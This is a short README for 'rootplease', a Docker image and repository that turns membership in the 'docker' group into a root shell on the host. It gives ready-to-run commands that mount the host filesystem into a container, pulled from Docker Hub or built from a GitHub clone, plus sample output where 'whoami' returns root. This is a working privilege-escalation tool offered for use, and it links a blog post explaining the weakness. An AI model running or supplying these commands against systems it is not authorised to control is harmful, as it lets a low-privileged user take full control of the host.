Root Please
===========

If you're a member of the 'docker' group on a machine, this command gives you a
root shell on the host OS. [See my blog post for
details](https://fosterelli.co/privilege-escalation-via-docker).

Supported architectures: amd64, arm64, arm/v7.  
Original Repository: [rootplease](https://github.com/chrisfosterelli/dockerrootplease)

How to Use
----------

Through Docker Hub:

```bash
> docker run -v /:/hostOS -it --rm aravindha1234u/rootplease
```
 
Or through Github:

```bash
> git clone https://github.com/aravindha1234u/rootplease rootplease
> cd rootplease/
> docker build -t rootplease .
> docker run -v /:/hostOS -it --rm rootplease
```

And the result:

```bash
aravindha@parrotos:~$ docker run -v /:/hostOS -it --rm aravindha1234u/rootplease

You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell
# whoami
root
# 
```
